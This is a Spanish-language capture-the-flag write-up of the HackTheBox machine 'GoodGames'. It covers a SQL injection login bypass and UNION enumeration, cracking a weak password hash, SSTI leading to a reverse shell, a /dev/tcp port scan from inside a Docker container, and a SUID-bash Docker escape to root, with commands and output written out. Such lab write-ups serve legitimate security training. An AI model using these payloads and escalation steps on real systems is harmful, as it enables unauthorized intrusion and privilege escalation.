---
title: HTB - GoodGames
published: true
categories: [Linux]
tags: [eJPT, eWPT, eCPPTv2, OSCP, Fácil]
---

<img src="/assets/HTB/GoodGames/goodgames.png">

¡Hola!
Vamos a resolver de la máquina `GoodGames` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **SQLI (Error Based)**
- **Hash Cracking Weak Algorithms**
- **Password Reuse**
- **Server Side Template Injection (SSTI)**
- **Docker Breakout (Privilege Escalation) [PIVOTING]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `GoodGames`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.130
PING 10.10.11.130 (10.10.11.130) 56(84) bytes of data.
64 bytes from 10.10.11.130: icmp_seq=1 ttl=63 time=42.3 ms

--- 10.10.11.130 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.130 -oG allPorts

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p80 10.10.11.130 -oN targeted

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb
```

Agregamos `goodgames.htb` a nuestro `/etc/hosts`

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://goodgames.htb
http://goodgames.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
```

Examinamos la página web pero no econtramos ninguna funcionalidad salvo un icono que nos abre un panel de login. Tratamos de realizar una inyección SQL pero el campo de correo está con validación con lo que procedemos a interceptar la petición con `BurpSuite` y tratar de inyectar el típico `test@test.com' or 1=1-- -`

<img src="/assets/HTB/GoodGames/burp.png">

En la ventana de la respuesta observamos que nos asignan una cookie de sesión. Redirigimos la petición a la página web y accedemos al perfil de admin

<img src="/assets/HTB/GoodGames/admin.png">

Nos percatamos de un icono de un engranaje el cual nos lleva al dominio `internal-administration.goodgames.htb`. Agregamos a nuestro `/etc/hosts` y observamos su contenido

<img src="/assets/HTB/GoodGames/flasklogin.png">

No tenemos credenciales pero sabemos que el campo de email del panel de login de la página principal es vulnerable a inyecciones SQL. Vamos a enumerar bases de datos, tablas y columnas de forma manual con BurpSuite. Capturamos la petición de login nuevamente e iniciamos pruebas.

Primero de todo vamos a tratar de aplicar un ordenamiento de los datos por una columna determinada la cual iremos ajustando hasta que la respuesta en el `content-Length` sea diferente. Empezamos por 100 donde tenemos una respuesta de 33490 hasta llegar a 4 donde tenemos una respuesta de 9267. Ya sabemos que tiene 4 columnas.

<img src="/assets/HTB/GoodGames/orderby.png">

Sabiendo el número exacto procedemos a aplicar una selección con `union select` y en la respuesta observamos que nos representa el contenido de la columna 4. 

<img src="/assets/HTB/GoodGames/unionselect.png">

Sustituimos el 4 por la query que nos muestra todas las bases de datos que existen. En este caso vemos dos, information_schema y main

<img src="/assets/HTB/GoodGames/schema.png">

Seguimos enumerando las tablas existentes en la tabla main. Localizamos blog, blog_comment y user

<img src="/assets/HTB/GoodGames/table.png">

Procedemos a listar columnas de la tabla users. Localizamos id, email, password y name

<img src="/assets/HTB/GoodGames/columns.png">

Finalmente sólo nos queda listar el contenido de las columnas password y name

<img src="/assets/HTB/GoodGames/user.png">
<img src="/assets/HTB/GoodGames/pass.png">

Obtenemos una password hasheada. Utilizamos la pàgina de `crackstation` para revelar la contraseña en texto claro

<img src="/assets/HTB/GoodGames/crackstation.png">

Volvemos al panel de logi de Flask y con las credenciales obtenidas ganamos acceso.

<img src="/assets/HTB/GoodGames/dashboard.png">

Explorando el dashboard aparentemente no tiene mucha funcionalidad salvo que nos permite modificar datos nuestro perfil. Probamos modificando el nombre y vemos el output de este campo en pantalla. Probamos con { { 7 x 7 } } a ver si es vulnerable a SSTI

<img src="/assets/HTB/GoodGames/ssti.png">

Sabiendo que es vulnerable vamos a la sección de SSTI de  `PayloadAllTheThings` y buscamos un payload el cual nos debe mostrar si podemos derivar el SSTI a un RCE mostrándonos el output del comando `id`

<img src="/assets/HTB/GoodGames/payload.png">
<img src="/assets/HTB/GoodGames/id.png">

Sustituimos el comando id por el onliner de bash para entablar una reverse shell y nos ponemos en escucha por el puerto 443 en nuestro equipo

<img src="/assets/HTB/GoodGames/revshell.png">

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.73] from (UNKNOWN) [10.10.11.130] 50558
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
whoami
root
root@3a453ab39d3d:/backend# hostname -I
hostname -I
172.19.0.2 
```

Hemos ganado acceso a la máquina pero observando la IP de la misma nos percatamos de que estamos dentro de un contenedor Docker

### Escalada De Privilegios Vía Docker Escape

* * *

Enumerando los adaptadores de red observamos que la Ip del contenedor es `172.19.0.2`. Habitualmente Docker asigna la primera dirección de la subred al host. Procedemos a escanear la IP `172.19.0.1` para ver posibles puertos abiertos para un posible movimiento lateral. También localizamos el nombre de un usuario en la carpeta `home` llamado `augustus`

```bash
root@3a453ab39d3d:/backend# for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT  &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
port 22 is open
port 80 is open
```

Localizamos puertos 22 y 80 abiertos. Probamos a conectarnos por ssh con el usuario `augustus` y la contraseña anteriormente revelada `superadministrator`

```bash
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ whoami
augustus
```
Localizamos la flag de usuario en su directorio personal `/home/augustus`

```bash
augustus@GoodGames:~$ cat /home/augustus/user.txt 
782c233c281f642d7***************
```
Observando detenidamente el /etc/passwd del contenedor vemos que no hay ningún usuario augustus por lo que deducimos que el deirectorio `/home/augustus` es una montura del directorio home del host. Se nos ocurre copiar el binario de bash dentro de la carpeta home de augustus, volver al contenedor donde somos root, asignamos propietario y grupo root a la bash, asignamos privilegios SUID y nos volvemos a conectar al host con augustus por ssh y ya tenemos una bash con privilegio SUID donde podemos acceder a root con el comando `bash -p`

```bash
augustus@GoodGames:~$ pwd
/home/augustus
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/backend# cd /home/augustus/
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod u+s bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1 s password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov 25 10:10:24 2022 from 172.19.0.2
augustus@GoodGames:~$ ls
bash  user.txt
augustus@GoodGames:~$ ls -la
total 1232
drwxr-xr-x 2 augustus augustus    4096 Nov 25 10:35 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsr-xr-x 1 root     root     1234376 Nov 25 10:35 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 augustus augustus      33 Nov 25 08:31 user.txt
augustus@GoodGames:~$ ./bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt 
0e1e68c764891001a***************
```

Hemos completado la máquina **GoodGames** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/GoodGames/pwned.png">
